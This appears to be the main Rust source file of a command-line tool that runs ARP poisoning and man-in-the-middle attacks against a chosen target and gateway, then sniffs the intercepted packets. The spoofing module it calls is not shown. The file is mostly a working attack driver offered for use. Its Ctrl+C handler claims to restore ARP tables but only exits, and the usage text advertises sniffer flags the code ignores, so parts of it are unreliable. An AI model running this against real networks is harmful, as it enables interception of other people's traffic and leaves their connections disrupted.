mod sniffing;

use sniffing::arp_spoofing::ArpSpoofer;
use sniffing::packet_sniffing::start_sniffer;
use std::net::Ipv4Addr;
use std::thread;
use std::time::Duration;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    
    println!("╔════════════════════════════════════════╗");
    println!("║   Network Security Tool v1.0          ║");
    println!("║   Sniffer + ARP Poisoning             ║");
    println!("╚════════════════════════════════════════╝\n");
    
    // Skip the program name (args[0])
    if args.len() < 2 {
        print_usage();
        return;
    }

    match args[1].as_str() {
        "sniff" => {
            // Pass remaining args to the sniffer
            start_sniffer(false, "", "");
        }
        
        "arp" => {
            if args.len() != 5 {
                println!("[!] Usage: sudo cargo run -- arp <interface> <target_ip> <gateway_ip>");
                println!("[!] Example: sudo cargo run -- arp en0 192.168.1.5 192.168.1.1");
                return;
            }
            
            let interface = args[2].clone();
            let target_ip: Ipv4Addr = args[3].parse().expect("Invalid target IP");
            let gateway_ip: Ipv4Addr = args[4].parse().expect("Invalid gateway IP");
            
            println!("[*] Starting ARP poisoning...");
            println!("[*] Target: {}", target_ip);
            println!("[*] Gateway: {}", gateway_ip);
            
            let mut spoofer = ArpSpoofer::new(&interface, target_ip, gateway_ip)
                .expect("Failed to create ARP spoofer");
            
            spoofer.discover().expect("Failed to discover MAC addresses");
            
            ctrlc::set_handler(move || {
                println!("\n[!] Ctrl+C detected! Restoring ARP tables...");
                std::process::exit(0);
            }).expect("Error setting Ctrl-C handler");
            
            spoofer.start_poisoning().expect("ARP poisoning failed");
        }
        
        "mitm" => {
            if args.len() < 4 {
                println!("[!] Usage: sudo cargo run -- mitm <target_ip> <gateway_ip>");
                println!("[!] Example: sudo cargo run -- mitm 192.168.1.5 192.168.1.1");
                return;
            }
            
            let target_ip = args[2].clone();
            let gateway_ip = args[3].clone();
            let target_parsed: Ipv4Addr = target_ip.parse().expect("Invalid target IP");
            let gateway_parsed: Ipv4Addr = gateway_ip.parse().expect("Invalid gateway IP");
            
            println!("[*] Starting MITM attack...");
            println!("[*] Target: {}", target_ip);
            println!("[*] Gateway: {}", gateway_ip);
            
            // Start ARP spoofing in background thread
            let target_clone = target_parsed;
            let gateway_clone = gateway_parsed;
            
            thread::spawn(move || {
                let mut spoofer = ArpSpoofer::new("en0", target_clone, gateway_clone)
                    .expect("Failed to create ARP spoofer");
                spoofer.discover().expect("Failed to discover MAC addresses");
                spoofer.start_poisoning().ok();
            });
            
            // Give ARP poisoning time to start
            println!("[*] Waiting for ARP poisoning to start...");
            thread::sleep(Duration::from_secs(3));
            
            // Start packet sniffer
            start_sniffer(true, &target_ip, &gateway_ip);
        }
        
        "devices" => {
            start_sniffer(false, "", "");
        }
        
        _ => {
            println!("[!] Unknown command: {}", args[1]);
            print_usage();
        }
    }
}

fn print_usage() {
    println!("Usage:");
    println!("  sudo cargo run -- sniff                      # Start packet sniffer");
    println!("  sudo cargo run -- arp <iface> <target> <gw>   # ARP poisoning attack");
    println!("  sudo cargo run -- mitm <target> <gw>          # MITM attack (ARP + sniff)");
    println!("  cargo run -- devices                          # List network devices");
    println!("\nSniffer Options (with 'sniff' command):");
    println!("  sudo cargo run -- sniff -V                    # Sniff with visualization");
    println!("  sudo cargo run -- sniff -v                    # Verbose mode");
    println!("  sudo cargo run -- sniff -p                    # Print devices");
    println!("  sudo cargo run -- sniff -d en0                # Use specific device");
    println!("\nExamples:");
    println!("  sudo cargo run -- sniff -V                    # Sniff with visualization");
    println!("  sudo cargo run -- arp en0 192.168.1.5 192.168.1.1");
    println!("  sudo cargo run -- mitm 192.168.1.5 192.168.1.1");
}